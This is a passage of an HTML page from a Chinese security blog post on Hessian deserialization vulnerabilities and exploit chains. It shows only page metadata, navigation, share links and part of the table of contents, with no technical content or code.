@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Hessian">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hessian反序列化漏洞分析和利用链">
+<meta property="og:url" content="http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
+<meta property="og:site_name" content="九指 | [ninefiger&#39;s blog]">
+<meta property="og:description" content="Hessian">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian反序列化漏洞分析和利用链/image-20240309121159784.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/image-20240309121236409.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/image-20240309121306522.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/image-20240309121318754.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709798650900-dd3e28ef-ffdd-48b2-87bb-6fcc4cd16e44.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709799007929-8d154874-8dc9-4ca5-ac9b-a2539033d04c.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709799411530-bc1e250e-aca8-4c1a-918d-2fc0eb3b990a.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709867667348-eff746c6-f4ba-4ba1-bc15-05d542be06ff.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709800441080-49ee525f-e3e7-40e1-882b-9bf61f8ae92a.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709867118537-1b714f67-163d-491b-b6fb-4f8edd961829.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709867130040-49c6f238-4a66-4c22-9b59-7191d43dd231.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709868313767-9d3c96a6-576f-4a02-8071-d6d7eade8f0d.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709869586881-5e41631e-c8e5-49ac-80f3-acf96be931ee.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709869751327-18a1fb1a-8a83-4ca7-8e1f-495f120ee873.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709870258031-5445511f-ed37-413e-9128-7544e77e54c1.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709870382517-514a963d-26cc-4c26-a4ae-e303a0465bc1.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709878822225-625ba422-c4e6-4789-a57c-386b52a2b167.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709878454096-afcce0f8-56d0-4753-bb5a-08b0164c2ecd.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709870449608-8d19d3ff-d108-48f0-b6da-dd808ffc31f0.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709879475904-cef2dd42-2a9e-4316-8305-ec5500ff9c87.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709880542327-f04bd1a6-55ae-4929-9101-7c9cbd9aa4c2.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709880569840-af11bd35-f51f-43f6-953e-a6e92cbd8ffb.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709881509467-23d7a0dc-f856-4f61-b269-93016de604d1.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709881663047-c2a13fe9-aaea-43ea-a6c4-95ccbfcb750b.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709881832821-e5e87847-97ca-4dd1-b4b9-0da0feebba39.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709882153911-1b9252cd-d94c-4b1d-bde6-9044c3fc7331.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709882178885-5d33de47-c3f1-47c4-a437-1b7054499d08.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709883315921-470ec0b6-1f83-43c2-b12d-37c040f11dd5.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709883359067-3fe8ecf1-a751-446b-bbc6-2fc8f59265d5.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709884070523-903801f1-e205-4dfb-a352-33e0e888a011.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709884824944-64cdd59c-9df1-4e32-ac14-2a48c1f2155e.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709885063232-1053f1c6-5fdf-47f1-a078-d002be13eee0.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709885178565-ce53c1f3-879c-44c0-84b5-190245e71098.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709885333725-b8022a95-e244-436e-9a20-a77b5548e788.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709886180266-e88521ec-4961-48ef-9a7f-3f6e8602d637.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887066255-816a5088-c84d-4a8f-84aa-a6c6a09bc77c.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian反序列化漏洞分析和利用链/1709887180638-000872aa-4e75-4ee8-a6ae-bb0722cc34ea.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887475258-4b47564f-4f42-42e3-8e48-c5c8db85aac1.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887623206-eb51d396-0e2d-44ca-bc31-8637c7c44158.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887739618-82ebedb0-96f7-4ebe-bc4e-3c57664085ce.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887849185-aeab51f3-254f-4722-8acc-7bfce4c8b19f.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887872183-25594b94-5dde-44d9-9b77-8d2f490dac77.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709889283532-55350583-f829-48f2-8c3e-06f037113987.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709899745035-bad899ed-8e5b-4906-88c8-349f2cc52f38.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709899688662-1f376d4b-f472-49d3-b5be-cc6e9ea1a8eb.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709900082703-00647a06-583a-4c0c-babd-f197097d3bd8.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709947243547-b32bbcb2-c400-4c67-a49e-79fc185eaca6.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948169333-6594f314-e622-4bd3-9df3-c27d2c0bf024.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948246576-6380b61f-0c71-4fcb-854c-ed31fca5ed58.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948394657-b6b1d64a-e38d-48d2-bace-f6d5d3a65d44.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948506479-6a36f4ee-62f9-4cb6-809f-926e8ad54c83.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948778030-155aad61-2e1f-4aeb-9a12-525da7133944.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948885204-afd5432f-ea2a-4338-b50e-e74f49ffc0aa.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709951890353-585decb2-0261-46ea-bfc2-206fcf07dab9.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709951387194-b2d502f6-e819-42c7-81c2-3d526d7568cc.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709951577514-3be54ac5-5f85-44c1-b404-086f298cea8e.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709952974144-06bdf0d5-8e0f-4894-b7bb-3d5b93938e6a.png">
+<meta property="article:published_time" content="2024-03-09T04:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-09T04:19:11.679Z">
+<meta property="article:author" content="ninefiger">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Hessian">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.ninefiger.top/img/Hessian反序列化漏洞分析和利用链/image-20240309121159784.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>Hessian反序列化漏洞分析和利用链</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="九指 | [ninefiger&#39;s blog]" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&text=Hessian反序列化漏洞分析和利用链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&is_video=false&description=Hessian反序列化漏洞分析和利用链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Hessian反序列化漏洞分析和利用链&body=Check out this article: http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&name=Hessian反序列化漏洞分析和利用链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&t=Hessian反序列化漏洞分析和利用链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%BC%96%E5%86%99%E5%92%8C%E8%BF%90%E8%A1%8C-Hessian"><span class="toc-number">1.</span> <span class="toc-text">1. 编写和运行 Hessian</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-Servlet"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 Servlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-Spring"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 Spring</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90%E5%92%8C%E8%B0%83%E8%AF%95-Hessian"><span class="toc-number">2.</span> <span class="toc-text">2. 分析和调试 Hessian</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 远程调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 漏洞点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-Map-%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 Map 类型的反序列化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">3. 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 